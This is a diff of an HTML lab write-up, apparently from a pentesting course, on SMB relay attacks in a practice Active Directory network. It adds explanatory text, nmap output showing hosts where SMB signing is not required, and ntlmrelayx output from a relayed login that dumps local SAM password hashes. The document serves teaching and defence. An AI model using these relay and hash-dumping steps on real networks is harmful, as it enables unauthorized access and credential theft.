@@ -373,8 +373,25 @@ document.write(`
 </section>
 <section id="what-can-go-wrong-here">
 <h2>What can go wrong here?<a class="headerlink" href="#what-can-go-wrong-here" title="Permalink to this heading">#</a></h2>
-<p>An SMB relay attack occurs when an attacker intercepts NTLM authentication traffic intended for one machine and relays it to another without cracking the credentials. Instead of capturing hashes for offline attacks, the attacker reuses the authentication in real time to gain unauthorized access, often achieving code execution or administrative privileges on the relayed system.</p>
-<p>SMB is vulnerable to relay attacks because NTLM authentication does not bind the client’s authentication attempt to the intended server. Without SMB signing, the protocol does not verify the integrity and authenticity of the messages, allowing attackers to insert themselves into the authentication process</p>
+<p><strong>the attacker positions themselves as a man-in-the-middle (MITM) between the client and the target system</strong></p>
+<ul class="simple">
+<li><p>An SMB relay attack occurs when an attacker intercepts NTLM authentication traffic intended for one machine and relays it to another without cracking the credentials. Instead of capturing hashes for offline attacks, the attacker reuses the authentication in real time to gain unauthorized access, often achieving code execution or administrative privileges on the relayed system.</p></li>
+<li><p>With LLMNR/NBT-NS poisoning (Responder), the attacker tricks the client into talking to them instead of the real server. Normally this just lets them capture the NTLM challenge–response.</p></li>
+<li><p>With SMB relay, instead of stopping there, the attacker forwards the client’s authentication attempt to a real server. The attacker is now in the middle:</p>
+<ul>
+<li><p>Client thinks it’s authenticating to the intended server.</p></li>
+<li><p>Target server thinks it’s authenticating the client.</p></li>
+<li><p>Attacker just passes messages back and forth, never needing to crack the password or hash.</p></li>
+</ul>
+</li>
+<li><p>SMB is vulnerable to relay attacks because NTLM authentication does not bind the client’s authentication attempt to the intended server. Without SMB signing, the protocol does not verify the integrity and authenticity of the messages, allowing attackers to insert themselves into the authentication process.</p></li>
+</ul>
+<figure class="align-center" id="id1">
+<a class="reference internal image-reference" href="../../../_images/smb-relay.png"><img alt="Sequence Diagram of Relay Attack" src="../../../_images/smb-relay.png" style="width: 100%;" /></a>
+<figcaption>
+<p><span class="caption-text">Relay Attack</span><a class="headerlink" href="#id1" title="Permalink to this image">#</a></p>
+</figcaption>
+</figure>
 </section>
 <section id="attack-requirements">
 <h2>Attack Requirements<a class="headerlink" href="#attack-requirements" title="Permalink to this heading">#</a></h2>
@@ -385,6 +402,41 @@ document.write(`
 <section id="step-1-identifying-workstations-without-smb-signing-enforced">
 <h3>Step 1: Identifying workstations without SMB Signing Enforced<a class="headerlink" href="#step-1-identifying-workstations-without-smb-signing-enforced" title="Permalink to this heading">#</a></h3>
 <div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">nmap</span> <span class="o">--</span><span class="n">script</span><span class="o">=</span><span class="n">smb2</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="n">mode</span><span class="o">.</span><span class="n">nse</span> <span class="o">-</span><span class="n">p445</span> <span class="o">&lt;</span><span class="n">target</span><span class="o">-</span><span class="n">ip</span><span class="o">&gt;</span> <span class="o">-</span><span class="n">Pn</span>
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.0.2.18</span>
+<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.0016</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+
+<span class="n">PORT</span>    <span class="n">STATE</span> <span class="n">SERVICE</span>
+<span class="mi">445</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span>
+<span class="n">MAC</span> <span class="n">Address</span><span class="p">:</span> <span class="mi">08</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">80</span><span class="p">:</span><span class="n">FA</span><span class="p">:</span><span class="n">D3</span> <span class="p">(</span><span class="n">PCS</span> <span class="n">Systemtechnik</span><span class="o">/</span><span class="n">Oracle</span> <span class="n">VirtualBox</span> <span class="n">virtual</span> <span class="n">NIC</span><span class="p">)</span>
+
+<span class="n">Host</span> <span class="n">script</span> <span class="n">results</span><span class="p">:</span>
+<span class="o">|</span> <span class="n">smb2</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="n">mode</span><span class="p">:</span>
+<span class="o">|</span>   <span class="mi">3</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span>
+<span class="o">|</span><span class="n">_</span>    <span class="n">Message</span> <span class="n">signing</span> <span class="n">enabled</span> <span class="ow">and</span> <span class="n">required</span>
+
+
+<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.0.2.17</span>
+<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.00082</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+
+<span class="n">PORT</span>    <span class="n">STATE</span> <span class="n">SERVICE</span>
+<span class="mi">445</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span>
+<span class="n">MAC</span> <span class="n">Address</span><span class="p">:</span> <span class="mi">08</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">92</span><span class="p">:</span><span class="n">B4</span><span class="p">:</span><span class="mi">94</span> <span class="p">(</span><span class="n">PCS</span> <span class="n">Systemtechnik</span><span class="o">/</span><span class="n">Oracle</span> <span class="n">VirtualBox</span> <span class="n">virtual</span> <span class="n">NIC</span><span class="p">)</span>
+
+<span class="n">Host</span> <span class="n">script</span> <span class="n">results</span><span class="p">:</span>
+<span class="o">|</span> <span class="n">smb2</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="n">mode</span><span class="p">:</span>
+<span class="o">|</span>   <span class="mi">3</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span>
+<span class="o">|</span><span class="n">_</span>    <span class="n">Message</span> <span class="n">signing</span> <span class="n">enabled</span> <span class="n">but</span> <span class="ow">not</span> <span class="n">required</span>
+
+
+<span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.0.2.16</span>
+<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.00058</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
+
+<span class="n">PORT</span>    <span class="n">STATE</span>    <span class="n">SERVICE</span>
+<span class="mi">445</span><span class="o">/</span><span class="n">tcp</span> <span class="n">filtered</span> <span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span>
+<span class="n">MAC</span> <span class="n">Address</span><span class="p">:</span> <span class="mi">08</span><span class="p">:</span><span class="mi">00</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="n">EA</span><span class="p">:</span><span class="n">E2</span><span class="p">:</span><span class="mi">55</span> <span class="p">(</span><span class="n">PCS</span> <span class="n">Systemtechnik</span><span class="o">/</span><span class="n">Oracle</span> <span class="n">VirtualBox</span> <span class="n">virtual</span> <span class="n">NIC</span><span class="p">)</span>
+
 </pre></div>
 </div>
 </section>
@@ -410,6 +462,16 @@ document.write(`
 <h3>Step 3: An Event Occurs and Credentials Get Relayed<a class="headerlink" href="#step-3-an-event-occurs-and-credentials-get-relayed" title="Permalink to this heading">#</a></h3>
 <p>When an event (such as LLMNR poisoning) occurrs, responder will capture this event, pass it to ntlmrelayx, which will relay the credentials to the targets in our targets file.</p>
 <p>In our lab we simulate an event by pointing to the attacker machine ip <code class="docutils literal notranslate"><span class="pre">\\10.0.2.15</span></code> on THEPUNISHER fcastle machine (fcastle is admin on SPIDERMAN so we can authenticate there and dump the local SAM hashes)</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Received</span> <span class="n">connection</span> <span class="kn">from</span> <span class="nn">MARVEL</span><span class="o">/</span><span class="n">fcastle</span> <span class="n">at</span> <span class="n">THEPUNISHER</span><span class="p">,</span> <span class="n">connection</span> <span class="n">will</span> <span class="n">be</span> <span class="n">relayed</span> <span class="n">after</span> <span class="n">re</span><span class="o">-</span><span class="n">authentication</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">SMBD</span><span class="o">-</span><span class="n">Thread</span><span class="o">-</span><span class="mi">6</span> <span class="p">(</span><span class="n">process_request_thread</span><span class="p">):</span> <span class="n">Connection</span> <span class="kn">from</span> <span class="nn">MARVEL</span><span class="o">/</span><span class="n">FCASTLE</span><span class="o">@</span><span class="mf">10.0.2.16</span> <span class="n">controlled</span><span class="p">,</span> <span class="n">attacking</span> <span class="n">target</span> <span class="n">smb</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0.2.17</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Authenticating</span> <span class="n">against</span> <span class="n">smb</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0.2.17</span> <span class="k">as</span> <span class="n">MARVEL</span><span class="o">/</span><span class="n">FCASTLE</span> <span class="n">SUCCEED</span>
+<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="n">Dumping</span> <span class="n">local</span> <span class="n">SAM</span> <span class="n">hashes</span> <span class="p">(</span><span class="n">uid</span><span class="p">:</span><span class="n">rid</span><span class="p">:</span><span class="n">lmhash</span><span class="p">:</span><span class="n">nthash</span><span class="p">)</span>
+<span class="n">Administrator</span><span class="p">:</span><span class="mi">500</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">7</span><span class="n">facdc498ed1680c4fd1448319a8c04f</span><span class="p">:::</span>
+<span class="n">Guest</span><span class="p">:</span><span class="mi">501</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">31</span><span class="n">d6cfe0d16ae931b73c59d7e0c089c0</span><span class="p">:::</span>
+<span class="n">DefaultAccount</span><span class="p">:</span><span class="mi">503</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="mi">31</span><span class="n">d6cfe0d16ae931b73c59d7e0c089c0</span><span class="p">:::</span>
+<span class="n">WDAGUtilityAccount</span><span class="p">:</span><span class="mi">504</span><span class="p">:</span><span class="n">aad3b435b51404eeaad3b435b51404ee</span><span class="p">:</span><span class="n">c7c36b0f2e6cf2201e6ce026fca58d9c</span><span class="p">:::</span>
+</pre></div>
+</div>
 <p>The SAM (Security Account Manager) is a database in Windows that stores local user account information, including hashed representations of passwords. When attackers “dump the SAM,” they extract these password hashes to attempt cracking or use them in pass-the-hash attacks.</p>
 <p>Each entry in a dumped SAM file typically follows the format:
 username:RID:LM hash:NT hash:::</p>
